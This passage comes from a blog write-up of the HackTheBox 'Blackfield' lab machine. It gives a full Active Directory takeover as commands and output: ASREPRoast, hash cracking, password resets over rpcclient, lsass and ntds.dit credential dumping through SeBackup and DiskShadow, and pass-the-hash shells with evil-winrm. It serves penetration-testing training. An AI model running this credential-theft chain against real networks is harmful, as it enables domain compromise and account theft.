starting with an uppercase letter that doesn&rsquo;t look like a name.</p><ul><li>audit2020</li><li>support</li><li>svc_backup</li></ul><p>We can save all profiles to a file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ printf %s <span style=color:#e6db74>&#39;dir&#39;</span> | smbclient //10.10.10.192/profiles$ <span style=color:#e6db74>&#39;&#39;</span> | sed <span style=color:#e6db74>&#39;1,3d;$d&#39;</span> | cut -d <span style=color:#e6db74>&#39; &#39;</span> -f <span style=color:#ae81ff>3</span> -s &gt; profiles.txt
</span></span></code></pre></div><p>As we know from <a href=https://nmap.org/>nmap</a> that the is Kerberos running, let&rsquo;s try ASREPRoast.</p><blockquote><p>The ASREPRoast attack looks for users without Kerberos pre-authentication
required attribute (DONT_REQ_PREAUTH).</p></blockquote><p>Ref. <a href=https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#asreproast>HackTricks - ASREPRoast</a></p><p>Then Impacket script <code>GetNPUsers</code> allow to check if Kerberos pre-auth
is enabled for those accounts and extract their password hash:</p><pre tabindex=0><code>$ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
[-] User audit2020 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
...
[-] User svc_backup doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</code></pre><p>Only <em>support</em> had is hash extracted.</p><pre tabindex=0><code>$ cat hash.txt
$krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94
</code></pre><p>Now we can crack it with <a href=https://www.openwall.com/john/>John the Ripper</a>:</p><pre tabindex=0><code>$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl
$ john hash.txt --show
$krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight

1 password hash cracked, 0 left
</code></pre><h2 id=rpc-enumeration>RPC enumeration<a hidden class=anchor aria-hidden=true href=#rpc-enumeration>#</a></h2><p>We can know make use of the freshly discovered credentials to launch an
authenticated RPC scan to find domain users.</p><pre tabindex=0><code>$ rpcclient -U support -W backfield.local 10.10.10.192
Enter BACKFIELD.LOCAL\support&#39;s password:
rpcclient $&gt; enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[BLACKFIELD764430] rid:[0x451]
user:[BLACKFIELD538365] rid:[0x452]
...
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
</code></pre><p>We can see <code>lydericlefebvre</code>, a new account we didn&rsquo;t see earlier.</p><p>Now let&rsquo;s list the domain groups:</p><pre tabindex=0><code>$ rpcclient $&gt; enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
</code></pre><p>Those are only default groups. Let&rsquo;s check info about the special accounts we
have.</p><pre tabindex=0><code>$ rpcclient $&gt; queryuser 0x586
        User Name   :   lydericlefebvre
        Full Name   :   Lyd├⌐ric aas. Lefebvre
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   @lydericlefebvre - VM Creator
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET
        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST
        Password last set Time   :      Fri, 28 Feb 2020 23:33:36 CET
        Password can change Time :      Sat, 29 Feb 2020 23:33:36 CET
        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x586
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
</code></pre><p>I don&rsquo;t know if this will be useful later but we now known that <code>lydericlefebvre</code>
could be able to create VM. There was nothing special about the other accounts.</p><h2 id=privilege-escalation-of-machine--from-support-to-audit2020>Privilege Escalation of Machine : from support to audit2020<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-support-to-audit2020>#</a></h2><p>In case our account is privileged we can try to change other account password.
<code>chgpasswd</code> won&rsquo;t help us as it requires the old password. But <code>setuserinfo</code>
doesn&rsquo;t.</p><pre tabindex=0><code>rpcclient $&gt; setuserinfo
Usage: setuserinfo username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
</code></pre><p>The <strong>level</strong> is defined from <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN">USER_INFORMATION_CLASS</a>.</p><pre tabindex=0><code>rpcclient $&gt; setuserinfo audit2020 23 cyfun123!

rpcclient $&gt; setuserinfo svc_backup 23 cyfun123!
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED

rpcclient $&gt; setuserinfo lydericlefebvre 23 cyfun123!
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
</code></pre><h2 id=privilege-escalation-of-machine--from-audit2020-to-svc_backup>Privilege Escalation of Machine : from audit2020 to svc_backup<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-audit2020-to-svc_backup>#</a></h2><p>With support or unauthenticated we were not able to list the content of the
<em>forensic</em> share but we can with audit2020. So let&rsquo;s dump all we can:</p><pre tabindex=0><code>$ mkdir -p Shares/forensic
$ cd Shares/forensic
$ smbclient //10.10.10.192/forensic -U audit2020 -W blackfield.local cyfun123!
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                7846143 blocks of size 4096. 4156574 blocks available
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
</code></pre><p>PS: a more clever approach would be to avoid dumping <code>tools/</code> which will take a
lot of time and space for generic binaries we do not need.</p><p>In <code>memory_analissy</code> there is a <code>lsass</code> dump.</p><pre tabindex=0><code>$ cd memory_analysis
$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP
</code></pre><p>Then we can use <strong>pypykatz</strong>, Python implementation of Mimikatz, to try to dump
hashes from here.</p><pre tabindex=0><code>$ pypykatz lsa minidump lsass.DMP &gt; lsass_dump.txt
INFO:root:Parsing file lsass.DMP
</code></pre><p>So we obtained those two SHA1 hashes:</p><pre tabindex=0><code>svc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c
Administrator:db5c89a961644f0978b4b69a4d2a2239d7886368
</code></pre><p>And NT hashes:</p><pre tabindex=0><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d
Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
</code></pre><p>We can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> to make a pass the hash (PtH) authentication
and gain PowerShell acess:</p><pre tabindex=0><code>$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; gc ../Desktop/user.txt
0d1d70d4c5439a332577fcbc2bcbed15
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;
</code></pre><h2 id=privilege-escalation-of-machine--from-svc_backup-to-root>Privilege Escalation of Machine : from svc_backup to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-svc_backup-to-root>#</a></h2><p>Let&rsquo;s check what we can do with this account:</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net user svc_backup
User name                    svc_backup
Full Name
Comment
User&#39;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/20/2020 9:38:19 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code></pre><p>Our account have way to much power!</p><blockquote><p><em>SeBackup</em> & <em>SeRestore</em> privileges (from the <em>Backup Operators</em> group) allow us to
set permissionand ownership on each file & folder.</p></blockquote><p>References:</p><ul><li><a href=https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/>DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018</a></li><li><a href=https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf>show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019</a></li></ul><p>Normally we shouldn&rsquo;t be able to access ntds.dit (Active Directory database)
but since <em>SeBackup</em> & <em>SeRestore</em> privileges let us set any permission on
any file we will be able to fix that.</p><p>Let&rsquo;s auto-gives us full control on <code>ntds.dit</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ntds_file = <span style=color:#e6db74>&#34;C:\Windows\NTDS\ntds.dit&#34;</span>
</span></span><span style=display:flex><span>$acl_ntds = Get-Acl $ntds_file
</span></span><span style=display:flex><span>$domain = <span style=color:#e6db74>&#34;blackfield.local&#34;</span>
</span></span><span style=display:flex><span>$account = <span style=color:#e6db74>&#34;svc_backup&#34;</span>
</span></span><span style=display:flex><span>$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule(<span style=color:#e6db74>&#34;</span>$domain<span style=color:#e6db74>\</span>$account<span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;FullControl&#34;</span>,<span style=color:#e6db74>&#34;Allow&#34;</span>)
</span></span><span style=display:flex><span>$acl_ntds.SetAccessRule($access_rule)
</span></span><span style=display:flex><span>$acl_ntds | Set-Acl $ntds_file
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Get-acl $ntds_file | select -expand accesstostring
</span></span><span style=display:flex><span>BLACKFIELD\svc_backup Allow  FullControl
</span></span><span style=display:flex><span>NT AUTHORITY\SYSTEM Allow  FullControl
</span></span><span style=display:flex><span>BUILTIN\Administrators Allow  FullContro
</span></span></code></pre></div><p>Now we&rsquo;ll use <code>DiskShadow</code> to make a shadow copy of the ntds.</p><blockquote><p>DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.</p><p><a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow>Microsoft Docs</a></p></blockquote><p>Let&rsquo;s prepapre the copy script (<code>diskshadow.txt</code>) to run <code>DiskShadow</code> in script
mode.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-batch data-lang=batch><span style=display:flex><span><span style=color:#66d9ef>set</span> context persistent nowriters#
</span></span><span style=display:flex><span>add volume c: alias cyfun#
</span></span><span style=display:flex><span>create#
</span></span><span style=display:flex><span>expose %cyfun% x:#
</span></span><span style=display:flex><span>exec <span style=color:#e6db74>&#34;cmd.exe&#34;</span> /c copy x:\windows\ntds\ntds.dit c:\Users\svc_backup\Videos\ntds.dit#
</span></span><span style=display:flex><span>delete shadows volume %cyfun%#
</span></span><span style=display:flex><span>reset#
</span></span></code></pre></div><p>Then we can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> native upload feature.</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; upload /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt
Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt to C:\Users\svc_backup\Videos\diskshadow.txt

Data: 268 bytes of 268 bytes copied

Info: Upload successful!
</code></pre><p>And then call <code>DiskShadow</code>.</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup&gt; diskshadow.exe /s C:\Users\svc_backup\Videos\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/21/2020 12:12:50 AM

-&gt; set context persistent nowriters
-&gt; add volume c: alias cyfun
-&gt; create
Alias cyfun for shadow ID {eef6f0be-3c60-4e69-985d-3bc400a24ff1} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} set as environment variable.

Querying all shadow copies with the shadow copy set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef}

        * Shadow copy ID = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}               %cyfun%
                - Shadow copy set: {12b5d80f-4368-4727-a02b-1b22f5e020ef}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 9/21/2020 12:12:51 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %cyfun% z:
-&gt; %cyfun% = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}
The shadow copy was successfully exposed as z:\.
-&gt; exec &#34;cmd.exe&#34; /c copy z:\windows\ntds\ntds.dit c:\Users\svc_backup\Videos\ntds.dit

The script file name is not valid.

EXEC &lt;file.cmd&gt;
        Execute a script file on the local machine.
        This command is used to duplicate or restore data as part of
        a backup or restore sequence.
</code></pre><p>As I got issues with the <code>exec</code> command I manually copied the file afterward:</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; cp x:\windows\ntds\ntds.dit .
</code></pre><p>Then we can also dump the SYSTEM hive:</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; reg save hklm\system system.hive
</code></pre><p>Again, we can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> native download feature.</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; download ntds.dit /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit
Info: Downloading C:\Users\svc_backup\Videos\ntds.dit to /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit

Info: Download successful!
</code></pre><p>Finally we can use <code>secretsdump</code> from Impacket to extract the hashes.</p><pre tabindex=0><code>$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...
</code></pre><p>Again a PtH using <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> with Administrator account.</p><pre tabindex=0><code>$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
511fa0e63117cc3e746a523d0b5fd0b8
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/cache/><span class=title>« Prev</span><br><span>Cache </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/admirer/><span class=title>Next »</span><br><span>Admirer</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>